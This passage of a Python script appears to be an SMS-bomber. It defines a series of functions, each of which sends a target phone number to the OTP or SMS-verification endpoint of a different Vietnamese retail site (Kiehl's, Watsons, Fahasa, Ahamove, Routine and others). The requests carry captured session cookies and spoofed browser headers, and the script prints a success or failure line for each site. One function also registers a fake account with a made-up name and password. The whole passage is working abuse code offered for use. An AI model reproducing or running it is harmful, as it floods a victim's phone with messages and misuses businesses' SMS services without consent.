            'https://www.kiehls.com.vn/on/demandware.store/Sites-kiehls-vn-ng-Site/vi_VN/SMSVerification-SendSMS',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("KIEHLS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("KIEHLS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def emart():
    cookies = {
        'emartsess': 'hk4hc7j1mnphvk2tg5dld4j0d3',
        'default': 'c4aca4bbfc3fc4949e4f881ec7',
        'language': 'vietn',
        'currency': 'VND',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'emartsess=hk4hc7j1mnphvk2tg5dld4j0d3; default=c4aca4bbfc3fc4949e4f881ec7; language=vietn; currency=VND',
        'Origin': 'https://emartmall.com.vn',
        'Referer': 'https://emartmall.com.vn/index.php?route=account/register',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'mobile': sdt,
    }

    try:
        response = requests.post(
            'https://emartmall.com.vn/index.php?route=account/register/smsRegister',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("EMART | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("EMART | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def watsons():
    cookies = {
        'dtCookie': 'v_4_srv_36_sn_78389D143AE67D0166F10A549E950094_perc_100000_ol_0_mul_1_app-3Aa156527b274862dd_0',
        'PIM-SESSION-ID': 'KeLTcCvBcFaAM7Ks',
        'ROUTE': '.api-6df67c4656-d6j6p',
        'AKA_A2': 'A',
        'ak_bmsc': 'E31AE1DCC8A5D8FB8538C991DE43DD4C~000000000000000000000000000000~YAAQyb0oFxTKab6QAQAAjFCE2Rjt8BLAhfR7mZCaJ7IABI/6nBYaj36Db0p6ZJDzG4KhkHXFPqZ+TnrJxNPp4QtxpGiNRy9IKWXIvkcbRaERswfeqZes6xN9l1tyZ9tnVqvGNxY6fWmj7bJ/wAqBmbn5nkthNqsOV248fyk0H2mnRw3a0cIWX4LNQFoPCYLwev0IjF5zAUaqdt9br3QIWk13QlTGmHkD9Zg0fcm17eh9ZiovLu+OxNX8+qm0WFfJ42UiWcntVhKCgAyle7Bt5+/YeKGSZBPvEWp8Z7pHm74JBvOjVnNUyQhHiu1G5MLaQ562LdPZQ6HlBlzKpXQz8hljtJGmaqO1ZQub5Uw8krLkElS252p4dArEACm3NIKvFiR5FgcGCk0UXFX0',
        'authorization': 'eIoVNH5XuB4bIiORjaaVO1iXwSU',
        'token_type': 'guest',
        'bm_mi': 'E2BE16B4175E923DABE3D82FBFF24664~YAAQyb0oF2Hjab6QAQAAN3uE2RgWjYGGJ8/uZoZObQVn1GO7IzJvpNTQqMJ33/xmfZhwdecFR3pZIrqQ6/hKiWsQcf7lkJBbLSAvwZ5XospWLtNcpsq58b1aBEPEL5VTicWc2Y0B27B1ehuBPTQaLBtz57IBvCiU7dImV33WirAOpq4wzpdHplX/ORU+ZvS1VveWGSDeWdBKyLi33cNInyM4lk0BXQT/Rd1cmhefuU2PK3D7S+oM86KiB6FUpnhaMH8du102SXZzAmELLItlAaR79Pgq7oX1pMjlC13gtNSSrd+88JTPT5HcK6fLuABMoK6/gRu6ZyMw~1',
        '_abck': '2EF1DA00357C893E967384BA03295C65~0~YAAQ31JNGxgxINmQAQAAGrmE2QzWa3gzvT6muyPn3xQyG66nWtsjmmz56fF161mJuOXOni/D1IiTzKVDPx6j58OfS7doDfha8HL37VbG5Xd3sTBiEQCOqO6qKdCPM+ldNYZQXfS06JbrCDjT5tmBX4MQAJ19emvH+u5757kK+WeNDROEKhmsqW/D/3jV3YI2perZITclDJxuuzEJKb33DGcc2EqLjRX7zzenCx0PyHUo60WvrR68rbo1hmzXy7o88P/wPBtfhKE2g2XHW7jaLDw3vpZvC2pg+QDS8MQMctG+JDbn6O/mi73YWqg3mBUonKzDs9k970iXZOsGSMYfzjrJM6Pkt8A5tW1a79TmH7c+FeprSaQb5SFDGtynUy0oM26QSNLFnamCcUdtQWnGtalq5WOA2MwEfVo7uL0vWaSNG4wr43FS+v4v/P4ylpx4o10TDcWCVVQJnzphjyhwxCR9i2b8WmbKKis8WH7tls3JspZbrRwbOg==~-1~-1~-1',
        'bm_sv': '65A51408418F3652B39E8481B85F70F3~YAAQ31JNGxkxINmQAQAAGrmE2RgTmiy1bNYdgQ4OjVlKLE7jmNL2DWFFfLF2mhgB1U2RGfPziEY3IYs2fKuknLfWZPEGvEZbSCKaqtoDgeT8Olk4p8YddYovOJ4S91mchuMPD2c0uOCKPLsMyc1SN2/ailEI+zLIn+S38H01hI+cTm30BM0ut7i1ueHR6SPFi9KpgZShseXoIn26/jAj4F6axZaLc3wLA5GQaEBcRsUGBbxTtA1aeMKtY9sIKl475w==~1',
        'bm_sz': '38994E99080E4985C36D7F989AEB7C92~YAAQ31JNGxoxINmQAQAAG7mE2RidSEMD/NtmBF9EO4NMTjX7d4awNQFjWTKEMuyzzi2BeaemzAuTOhgMAIPbOQiEjHfkN4C7S/z8uy4EfOdlRUNrny86trif+7fc9EtWIhmmJAbXv0+wOTXn8nVwgtKLWdtF2phFNfOkHtCEp5vT1fPcy48wj0LvXUrQk79lHolDtz/RHK1AiYu7k6an3/Kr21zMiK3+73jr43XGIPF9PZkWyvGREnG2fwYSQfb5b2l+NxMxVnANG/vVzOhBhHvYKE03/eGUgbIbM6OGzkeWovx284X0BrUXkKGzaWXpxTg69k/y+Enu0t+cyEkDZf8EjnJL7yRPk7RDPJ1LM75CjY+scUUVkrs7dqe10RIdC5l2R9lcDSZ7CzQXMbMirxuPfC96MS+E2doINPeHBIZUFyZCWnaKYRHzRB6uxQ==~4277571~3687480',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': 'bearer eIoVNH5XuB4bIiORjaaVO1iXwSU',
        'cache-control': 'no-cache, no-store, must-revalidate, post-check=0, pre-check=0',
        'content-type': 'application/json',
        # 'cookie': 'dtCookie=v_4_srv_36_sn_78389D143AE67D0166F10A549E950094_perc_100000_ol_0_mul_1_app-3Aa156527b274862dd_0; PIM-SESSION-ID=KeLTcCvBcFaAM7Ks; ROUTE=.api-6df67c4656-d6j6p; AKA_A2=A; ak_bmsc=E31AE1DCC8A5D8FB8538C991DE43DD4C~000000000000000000000000000000~YAAQyb0oFxTKab6QAQAAjFCE2Rjt8BLAhfR7mZCaJ7IABI/6nBYaj36Db0p6ZJDzG4KhkHXFPqZ+TnrJxNPp4QtxpGiNRy9IKWXIvkcbRaERswfeqZes6xN9l1tyZ9tnVqvGNxY6fWmj7bJ/wAqBmbn5nkthNqsOV248fyk0H2mnRw3a0cIWX4LNQFoPCYLwev0IjF5zAUaqdt9br3QIWk13QlTGmHkD9Zg0fcm17eh9ZiovLu+OxNX8+qm0WFfJ42UiWcntVhKCgAyle7Bt5+/YeKGSZBPvEWp8Z7pHm74JBvOjVnNUyQhHiu1G5MLaQ562LdPZQ6HlBlzKpXQz8hljtJGmaqO1ZQub5Uw8krLkElS252p4dArEACm3NIKvFiR5FgcGCk0UXFX0; authorization=eIoVNH5XuB4bIiORjaaVO1iXwSU; token_type=guest; bm_mi=E2BE16B4175E923DABE3D82FBFF24664~YAAQyb0oF2Hjab6QAQAAN3uE2RgWjYGGJ8/uZoZObQVn1GO7IzJvpNTQqMJ33/xmfZhwdecFR3pZIrqQ6/hKiWsQcf7lkJBbLSAvwZ5XospWLtNcpsq58b1aBEPEL5VTicWc2Y0B27B1ehuBPTQaLBtz57IBvCiU7dImV33WirAOpq4wzpdHplX/ORU+ZvS1VveWGSDeWdBKyLi33cNInyM4lk0BXQT/Rd1cmhefuU2PK3D7S+oM86KiB6FUpnhaMH8du102SXZzAmELLItlAaR79Pgq7oX1pMjlC13gtNSSrd+88JTPT5HcK6fLuABMoK6/gRu6ZyMw~1; _abck=2EF1DA00357C893E967384BA03295C65~0~YAAQ31JNGxgxINmQAQAAGrmE2QzWa3gzvT6muyPn3xQyG66nWtsjmmz56fF161mJuOXOni/D1IiTzKVDPx6j58OfS7doDfha8HL37VbG5Xd3sTBiEQCOqO6qKdCPM+ldNYZQXfS06JbrCDjT5tmBX4MQAJ19emvH+u5757kK+WeNDROEKhmsqW/D/3jV3YI2perZITclDJxuuzEJKb33DGcc2EqLjRX7zzenCx0PyHUo60WvrR68rbo1hmzXy7o88P/wPBtfhKE2g2XHW7jaLDw3vpZvC2pg+QDS8MQMctG+JDbn6O/mi73YWqg3mBUonKzDs9k970iXZOsGSMYfzjrJM6Pkt8A5tW1a79TmH7c+FeprSaQb5SFDGtynUy0oM26QSNLFnamCcUdtQWnGtalq5WOA2MwEfVo7uL0vWaSNG4wr43FS+v4v/P4ylpx4o10TDcWCVVQJnzphjyhwxCR9i2b8WmbKKis8WH7tls3JspZbrRwbOg==~-1~-1~-1; bm_sv=65A51408418F3652B39E8481B85F70F3~YAAQ31JNGxkxINmQAQAAGrmE2RgTmiy1bNYdgQ4OjVlKLE7jmNL2DWFFfLF2mhgB1U2RGfPziEY3IYs2fKuknLfWZPEGvEZbSCKaqtoDgeT8Olk4p8YddYovOJ4S91mchuMPD2c0uOCKPLsMyc1SN2/ailEI+zLIn+S38H01hI+cTm30BM0ut7i1ueHR6SPFi9KpgZShseXoIn26/jAj4F6axZaLc3wLA5GQaEBcRsUGBbxTtA1aeMKtY9sIKl475w==~1; bm_sz=38994E99080E4985C36D7F989AEB7C92~YAAQ31JNGxoxINmQAQAAG7mE2RidSEMD/NtmBF9EO4NMTjX7d4awNQFjWTKEMuyzzi2BeaemzAuTOhgMAIPbOQiEjHfkN4C7S/z8uy4EfOdlRUNrny86trif+7fc9EtWIhmmJAbXv0+wOTXn8nVwgtKLWdtF2phFNfOkHtCEp5vT1fPcy48wj0LvXUrQk79lHolDtz/RHK1AiYu7k6an3/Kr21zMiK3+73jr43XGIPF9PZkWyvGREnG2fwYSQfb5b2l+NxMxVnANG/vVzOhBhHvYKE03/eGUgbIbM6OGzkeWovx284X0BrUXkKGzaWXpxTg69k/y+Enu0t+cyEkDZf8EjnJL7yRPk7RDPJ1LM75CjY+scUUVkrs7dqe10RIdC5l2R9lcDSZ7CzQXMbMirxuPfC96MS+E2doINPeHBIZUFyZCWnaKYRHzRB6uxQ==~4277571~3687480',
        'expires': '0',
        'if-modified-since': 'Mon, 22 Jul 2024 08:17:50 GMT',
        'origin': 'https://www.watsons.vn',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'queue-target': 'https://www.watsons.vn/vi/register',
        'queueit-target': 'https://www.watsons.vn/vi/register',
        'referer': 'https://www.watsons.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'vary': '*',
    }

    params = {
        'formId': 'registrationOTPForm_Web3',
        'lang': 'vi',
        'curr': 'VND',
    }

    json_data = {
        'uid': '',
        'action': 'REGISTRATION',
        'countryCode': '84',
        'target': sdt,
        'type': 'SMS',
    }

    try:
        response = requests.post(
            'https://api.watsons.vn/api/v2/wtcvn/otpToken',
            params=params,
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("WATSONS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("WATSONS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def hanoia():
    cookies = {
        'PHPSESSID': 'ah759kbp93umoqr5180jcbf75c',
        'form_key': 'dlinj8ESlS5lQx06',
        'form_key': 'dlinj8ESlS5lQx06',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        'mage-messages': '',
        'private_content_version': '88ede4a3f3efc946fd38132bc5254912',
        'section_data_ids': '%7B%7D',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=ah759kbp93umoqr5180jcbf75c; form_key=dlinj8ESlS5lQx06; form_key=dlinj8ESlS5lQx06; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; private_content_version=88ede4a3f3efc946fd38132bc5254912; section_data_ids=%7B%7D',
        'origin': 'https://hanoia.com',
        'priority': 'u=1, i',
        'referer': 'https://hanoia.com/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'number_phone': sdt,
        'form_key': 'dlinj8ESlS5lQx06',
        'currentUrl': 'https://hanoia.com/customer/account/create/',
    }

    try:
        response = requests.post('https://hanoia.com/smsmarketing/customer/sendOTP', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HANOIA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HANOIA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def ahamove():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://app.ahamove.com',
        'priority': 'u=1, i',
        'referer': 'https://app.ahamove.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'mobile': sdt,
        'country_code': 'VN',
        'firebase_sms_auth': True,
    }

    try:
        response = requests.post('https://api.ahamove.com/api/v3/public/user/login', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("AHAMOVE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("AHAMOVE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def fahasa():
    cookies = {
        'frontend': '2f118fe3b8c748c78199208b10b3f9cb',
        'utm_source': 'chin',
        'click_id': '8vTZ22kVeRZoISe',
        'utm_medium': 'chin',
        'utm_campaign': 'chin',
        'utm_term': 'chin',
        'utm_content': 'chin',
        'frontend_cid': 'uqAGx0CC6GhLtoUa',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'frontend=2f118fe3b8c748c78199208b10b3f9cb; utm_source=chin; click_id=8vTZ22kVeRZoISe; utm_medium=chin; utm_campaign=chin; utm_term=chin; utm_content=chin; frontend_cid=uqAGx0CC6GhLtoUa',
        'origin': 'https://www.fahasa.com',
        'priority': 'u=1, i',
        'referer': 'https://www.fahasa.com/?ref=chin&utm_source=chin&utm_medium=chin&utm_campaign=chin&utm_term=chin&utm_content=chin&click_id=8vTZ22kVeRZoISe',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FAHASA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FAHASA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL) 

def vascara():
    cookies = {
        'SHASH': 'ijiugnnbjqt1sravu0ag6dpvhn',
        'ctk': 'a98dd75f4edd2233308533430aebf26fcf6d1791d43bd503f95fd2b8f3f9bd3c',
        'fwlc': 'MQ%3D%3D',
        '_t': 'ijiugnnbjqt1sravu0ag6dpvhn',
        'ctiic': 'MA%3D%3D',
        'cokilocationcode': 'dm4%3D',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'SHASH=ijiugnnbjqt1sravu0ag6dpvhn; ctk=a98dd75f4edd2233308533430aebf26fcf6d1791d43bd503f95fd2b8f3f9bd3c; fwlc=MQ%3D%3D; _t=ijiugnnbjqt1sravu0ag6dpvhn; ctiic=MA%3D%3D; cokilocationcode=dm4%3D',
        'origin': 'https://www.vascara.com',
        'priority': 'u=0, i',
        'referer': 'https://www.vascara.com/register/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = {
        'token': '6c6cf6eeb0482f868c3f921b12bf01ef4b1baef6',
        'fphone': sdt,
        'ffullname': 'nguyen thi huyen',
        'fpassword': '123123aA@',
        'fagree': '1',
        'fsubmit': '1',
    }

    try:
        response = requests.post('https://www.vascara.com/register/', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VASCARA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VASCARA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def sablanca():
    cookies = {
        'ASP.NET_SessionId': '1psn00n0dg1cj303ia2pi32e',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'ASP.NET_SessionId=1psn00n0dg1cj303ia2pi32e',
        'Origin': 'https://sablanca.vn',
        'Referer': 'https://sablanca.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'numberphone': sdt,
        'utm_source': 'Register',
    }

    try:
        response = requests.post('https://sablanca.vn/User/CheckCustomerPhoneIsCreateV21', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SABLANCA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SABLANCA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def sandro():
    cookies = {
        'PHPSESSID': 'e4dm9dd73g7s1p5s8a0408osmu',
        'form_key': 'MVfTxS24jyAJkIgf',
        'form_key': 'MVfTxS24jyAJkIgf',
        'category_first': '3',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        'mage-messages': '',
        'mgn_menu_category_1': '21',
        'private_content_version': '4fa1b90d7f995085e3ce9442f6fa924a',
        'section_data_ids': '%7B%7D',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=e4dm9dd73g7s1p5s8a0408osmu; form_key=MVfTxS24jyAJkIgf; form_key=MVfTxS24jyAJkIgf; category_first=3; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; mgn_menu_category_1=21; private_content_version=4fa1b90d7f995085e3ce9442f6fa924a; section_data_ids=%7B%7D',
        'origin': 'https://sandro.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://sandro.com.vn/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'number_phone': sdt,
        'form_key': 'MVfTxS24jyAJkIgf',
        'currentUrl': 'https://sandro.com.vn/customer/account/create/',
    }

    try:
        response = requests.post('https://sandro.com.vn/smsmarketing/customer/sendOTP', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SANDRO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SANDRO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def routine():
    cookies = {
        'wp_ga4_customerGroup': 'NOT%20LOGGED%20IN',
        'X-Magento-Vary': '7ad851671356eb8fbf873fbdb216dde0a2e0c003',
        'PHPSESSID': 'j54mg8mlaj1fe1tpa8n7lig4g1',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        'mage-messages': '',
        'form_key': 'JUHbfiSaEBTLQRud',
        'private_content_version': '7f7eeb6ab1ef8a3d8536cfcfa413ff07',
        'section_data_ids': '%7B%22customer%22%3A1721578592%2C%22compare-products%22%3A1721578592%2C%22last-ordered-items%22%3A1721578592%2C%22cart%22%3A1721644002%2C%22directory-data%22%3A1721578592%2C%22captcha%22%3A1721578592%2C%22instant-purchase%22%3A1721578592%2C%22loggedAsCustomer%22%3A1721578592%2C%22persistent%22%3A1721644002%2C%22review%22%3A1721578592%2C%22wishlist%22%3A1721578592%2C%22ammessages%22%3A1721578592%2C%22chatData%22%3A1721578592%2C%22guest_wishlist%22%3A1721578592%2C%22magenest-fbpixel-atc%22%3A1721578592%2C%22magenest-fbpixel-subscribe%22%3A1721578592%2C%22google-tag-manager-product-info%22%3A1721578592%2C%22wp_ga4%22%3A1721578592%2C%22recently_viewed_product%22%3A1721578592%2C%22recently_compared_product%22%3A1721578592%2C%22product_data_storage%22%3A1721578592%2C%22paypal-billing-agreement%22%3A1721578592%2C%22messages%22%3A1721644002%7D',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'wp_ga4_customerGroup=NOT%20LOGGED%20IN; X-Magento-Vary=7ad851671356eb8fbf873fbdb216dde0a2e0c003; PHPSESSID=j54mg8mlaj1fe1tpa8n7lig4g1; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; form_key=JUHbfiSaEBTLQRud; private_content_version=7f7eeb6ab1ef8a3d8536cfcfa413ff07; section_data_ids=%7B%22customer%22%3A1721578592%2C%22compare-products%22%3A1721578592%2C%22last-ordered-items%22%3A1721578592%2C%22cart%22%3A1721644002%2C%22directory-data%22%3A1721578592%2C%22captcha%22%3A1721578592%2C%22instant-purchase%22%3A1721578592%2C%22loggedAsCustomer%22%3A1721578592%2C%22persistent%22%3A1721644002%2C%22review%22%3A1721578592%2C%22wishlist%22%3A1721578592%2C%22ammessages%22%3A1721578592%2C%22chatData%22%3A1721578592%2C%22guest_wishlist%22%3A1721578592%2C%22magenest-fbpixel-atc%22%3A1721578592%2C%22magenest-fbpixel-subscribe%22%3A1721578592%2C%22google-tag-manager-product-info%22%3A1721578592%2C%22wp_ga4%22%3A1721578592%2C%22recently_viewed_product%22%3A1721578592%2C%22recently_compared_product%22%3A1721578592%2C%22product_data_storage%22%3A1721578592%2C%22paypal-billing-agreement%22%3A1721578592%2C%22messages%22%3A1721644002%7D',
        'origin': 'https://routine.vn',
        'priority': 'u=1, i',
        'referer': 'https://routine.vn/phu-kien/giay-dep.html',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'telephone': sdt,
        'isForgotPassword': '0',
    }

    try:
        response = requests.post('https://routine.vn/customer/otp/send/', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("ROUTINE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("ROUTINE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
        
def coolmate():
    cookies = {
        'device_token': '597f946e29e835d88f56392f40ea75c3',
        'box_token': '9dbb29f1bd9e93ef4a5f8468ff0b5618',
        'cart_quantity': '0',
        'active-voucher1': 'true',
        'g_state': '{"i_p":1725246086128,"i_l":4}',
